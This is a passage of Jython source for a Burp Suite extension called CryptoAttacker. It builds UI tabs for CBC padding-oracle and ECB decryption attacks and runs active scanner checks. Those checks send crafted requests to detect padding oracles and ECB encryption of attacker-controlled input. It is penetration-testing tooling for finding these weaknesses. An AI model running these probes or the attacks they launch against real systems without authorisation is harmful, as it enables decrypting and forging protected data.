        cbcEncryptAttackButton = swing.JButton("Attack", actionPerformed=self.paddingEncryptAttack)
        cbcEncryptCancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)

        self.plaintextisAsciiHex = swing.JCheckBox("ASCII Hex")
        plaintextlabel = swing.JLabel()
        plaintextlabel.setText("Plaintext: ")
        self.plaintextField = swing.JTextField()
        self.plaintextField.setPreferredSize(awt.Dimension(300, 30))

        toprow.add(encryptAddMarkButton)
        toprow.add(encryptClearMarksButton)
        toprow.add(cbcEncryptAttackButton)
        toprow.add(cbcEncryptCancelAttackButton)

        botrow.add(plaintextlabel)
        botrow.add(self.plaintextField)
        botrow.add(self.plaintextisAsciiHex)
        encryptButtons.add(toprow)
        encryptButtons.add(botrow)

        self._encryptTab.setLeftComponent(encryptButtons)


        self.encryptBodies = swing.JTabbedPane()
        self._encRequestViewer = self._callbacks.createTextEditor()
        self._encResponseViewer = self._callbacks.createTextEditor()
        self._encResponseViewer.setEditable(False)
        self.encryptBodies.addTab("Request", self._encRequestViewer.getComponent())

        #output should include status, etc.
        self.encryptBodies.addTab("Output", self._encResponseViewer.getComponent())
        self._encryptTab.setRightComponent(self.encryptBodies)

        self._mainPane.addTab("CBC Encrypt", self._encryptTab)


        ### ECB Decrypt Tab ###
        self._ecbDecTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        ecbDecButtons = swing.JPanel()
        ecbDecButtons.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        self._ecbDecTab.setLeftComponent(ecbDecButtons)
        ecbDecAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UIecbDecAddPressed)
        ecbDecClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UIecbDecClearPressed)
        ecbDecAttackButton = swing.JButton("Attack", actionPerformed=self.ecbDecryptAttack) 
        cancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)
    

        ecbDecButtons.add(ecbDecAddMarkButton)
        ecbDecButtons.add(ecbDecClearMarksButton)
        ecbDecButtons.add(ecbDecAttackButton)
        ecbDecButtons.add(cancelAttackButton)


        self.ecbDecBodies = swing.JTabbedPane()
        self._ecbDecRequestViewer = self._callbacks.createTextEditor()
        self._ecbDecResponseViewer = self._callbacks.createTextEditor()
        self._ecbDecResponseViewer.setEditable(False)
        self.ecbDecBodies.addTab("Request", self._ecbDecRequestViewer.getComponent())

        #output should include status, etc.
        self.ecbDecBodies.addTab("Output", self._ecbDecResponseViewer.getComponent())
        self._ecbDecTab.setRightComponent(self.ecbDecBodies)

        self._mainPane.addTab("ECB Decrypt", self._ecbDecTab)


        
        subPane = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)
        reqPane = swing.JPanel()
        reqEditor = self._callbacks.createTextEditor()
        stupid = self._callbacks.createTextEditor()
        subPane.setRightComponent(stupid.getComponent())
        subPane.setLeftComponent(reqEditor.getComponent())
        
        # customize our UI components
        self._callbacks.customizeUiComponent(self._mainPane)
        self._callbacks.customizeUiComponent(self._optionsTab)
        self._callbacks.customizeUiComponent(self._BlobEncodingTable)
        
        # add the custom tab to Burp's UI
        self._callbacks.addSuiteTab(self)
        return

    def UICbcDecAddPressed(self, stuff):
        self.UIaddMarker(self._decRequestViewer)

    def UICbcDecClearPressed(self, stuff):
        self.UIclearMarkers(self._decRequestViewer)

    def UICbcEncAddPressed(self, stuff):
        self.UIaddMarker(self._encRequestViewer)

    def UICbcEncClearPressed(self, stuff):
        self.UIclearMarkers(self._encRequestViewer)

    def UIecbDecAddPressed(self, stuff):
        self.UIaddMarker(self._ecbDecRequestViewer)

    def UIecbDecClearPressed(self, stuff):
        self.UIclearMarkers(self._ecbDecRequestViewer)

    def UIaddMarker(self, component):
        selectedBounds = component.getSelectionBounds()
        reqText = self._helpers.bytesToString(component.getText())
        if selectedBounds[0] == selectedBounds[1]:
            reqText = reqText[:selectedBounds[0]] + u"\u00a7" + reqText[selectedBounds[0]:] 
        else:
            reqText = reqText[:selectedBounds[0]] + u"\u00a7" + reqText[selectedBounds[0]:selectedBounds[1]] + u"\u00a7" + reqText[selectedBounds[1]:] 

        component.setText(reqText)
        component.setSearchExpression(u'\u00a7')
        
    def UIclearMarkers(self, component):
        selectedBounds = component.getSelectionBounds()
        reqText = self._helpers.bytesToString(component.getText())
        reqText = reqText.replace(u'\u00a7', "")
        component.setText(reqText)
        return

    def UIAddEncodingRow(self, stuff):
        model =  self._BlobEncodingTable.getModel()
        #count = self._BlobEncodingTable.getRowCount()
        model.addRow(["Auto (heuristics)"])
        return

    def UIDelEncodingRow(self, stuff):
        model =  self._BlobEncodingTable.getModel()
        count = self._BlobEncodingTable.getRowCount()
        row = self._BlobEncodingTable.getSelectedRow()
        if row != -1:
            model.removeRow(row)
        elif count >= 1:
            model.removeRow(count-1)
        return

    def UIAddPaddingRow(self, stuff):
        model =  self._CBCErrorTable.getModel()
        model.addRow(["Auto (heuristics)"])
        return

    def UIDelPaddingRow(self, stuff):
        model =  self._CBCErrorTable.getModel()
        count = self._CBCErrorTable.getRowCount()
        row = self._CBCErrorTable.getSelectedRow()
        if row != -1:
            model.removeRow(row)
        elif count >= 1:
            model.removeRow(count-1)
        return

    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Crypto Attacks")
        
        self.port =None
        self.host = None
        self.useHTTPS = None

        self.addUI()

        callbacks.registerContextMenuFactory(self)
        callbacks.registerScannerCheck(self)


        return
        
    
    def getTabCaption(self):
        return "Crypto Attacker"
    
    def getUiComponent(self):
        return self._mainPane
        

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        return


    #todo - when both set the checks interfere with one another
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        #TODO consult UI as to whether to check anything
        httpservice = baseRequestResponse.getHttpService()
        self.port = httpservice.getPort()
        self.host = httpservice.getHost()
        if httpservice.getProtocol() == "https":
            self.useHTTPS = True
        else:
            self.useHTTPS = False


        issues = []
        reqinfo = self._helpers.analyzeRequest(baseRequestResponse)

        if self.activeScanPaddingOracle.isSelected():
            if self.detectPaddingOracle(baseRequestResponse, insertionPoint):
                reqresp = self._callbacks.applyMarkers(baseRequestResponse, [insertionPoint.getPayloadOffsets(insertionPoint.getBaseValue())], None)

                detail = "The application appears to have a padding oracle. This parameter can be arbitrarily encrypted/decrypted. This might indicate a padding error: <br />,br />"
                detail += self.cbcErrors[0][0] + " " + self.cbcErrors[0][1]
                issue = CustomScanIssue(httpservice, reqinfo.getUrl(), [reqresp], "Padding Oracle",  detail, "Firm", "High")
                issues.append(issue)

            


        if self.activeScanECB.isSelected():
            #96 is enough for 3 256 bit blocks, and should repeat
            origResp = self._helpers.bytesToString(baseRequestResponse.getResponse())
            ecbReq = insertionPoint.buildRequest(self._helpers.stringToBytes("A" * 96))
            #print ecbReq
            ecbResp = self._helpers.bytesToString(self._callbacks.makeHttpRequest(httpservice, ecbReq).getResponse())

            #TODO add length check to skip (if ecbResp not longer than origResp)

            blobRegex = r"[A-Za-z0-9+/=]{16}[A-Za-z0-9+/=]*"

            origRespBlobs = re.findall(blobRegex, origResp)
            ecbRespBlobs = re.findall(blobRegex, ecbResp)

            for blob in ecbRespBlobs:
                if blob not in origRespBlobs and self.guessEncoding(blob):
                    blob = self.decodeBlob(blob)
                    if self.ecbGetBlocksize(blob) != -1:
                        reqinfo = self._helpers.analyzeRequest(baseRequestResponse)
                        #TODO highlight blob in response
                        reqresp = self._callbacks.applyMarkers(baseRequestResponse, [insertionPoint.getPayloadOffsets(insertionPoint.getBaseValue())], None)
                        detail = "The application appears to encrypt attacker controlled text with ECB. Anything else encrypted with this key is decryptable/encryptable."
                        issue = CustomScanIssue(httpservice, reqinfo.getUrl(), [reqresp], "ECB with Attacker input",  detail, "Firm", "High")
                        issues.append(issue)


        return issues

    def detectPaddingOracle(self, baseRequestResponse, insertionPoint):
        #TODO add 256 requests and make sure?
        blob = insertionPoint.getBaseValue()
        if blob == "":
            return False

        #tmark is url encoding safe
        tmark = "95f9c35e-8a5f-4ca8-b0a4-4b2907ce0675"
        payload = tmark + blob + tmark

        #req needs to be modified to our kludgy format because our attack doesn't have "insertionpoints"
        req = insertionPoint.buildRequest(self._helpers.stringToBytes(payload))
        req = self._helpers.bytesToString(req).replace(tmark, u"\u00a7")

        if not self.initConfig(req, blob, sys.stdout.write, "cbcscan"):
            return False
        return True

    #TODO returns length of the block if it repeats, else returns -1
    #TODO rename to something like ecbGetBlocksize
    def ecbGetBlocksize(self, blob):
        datasplit = []
        elem = ""
        for i in range(0,len(blob)):
            elem += chr(blob[i])
            if len(elem) % 8 == 0:
                datasplit.append(elem)
                elem = ""
        for b in datasplit:
            if datasplit.count(b) > 1:
                return 16 #TODO no, calculate length - for now just do 16
        return -1


    #Given a new response, reqturns the blob of enc(something | controlled | something)
    #TODO needs to respect config options
    #TODO use this in the scanner so only have to write once
    def extractRepeatingBlock(self, initResp, newResp):
        #todo {16} can be len(longblob) - should configure this better instead of hardcoding 96
        blobRegex = r"[A-Za-z0-9+/=]{96}[A-Za-z0-9+/=]*"

        origRespBlobs = re.findall(blobRegex, initResp)
        ecbRespBlobs = re.findall(blobRegex, newResp)

        for blob in ecbRespBlobs:
            if blob not in origRespBlobs and self.guessEncoding(blob):
                blob = self.decodeBlob(blob)
                if self.ecbGetBlocksize(blob) != -1:
                    return blob


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by CryptoAttacker</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: "+name+" on "+str(url)
        return
    
    def getUrl(self):
        return self.Url
     
    def getIssueName(self):
        return self.Name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self.Severity
    
    def getConfidence(self):
        return self.Confidence
    
    def getIssueBackground(self):
        return None
    
    def getRemediationBackground(self):
        return None
    
    def getIssueDetail(self):
        return self.Detail
    
    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages
    
    def getHttpService(self):
        return self.HttpService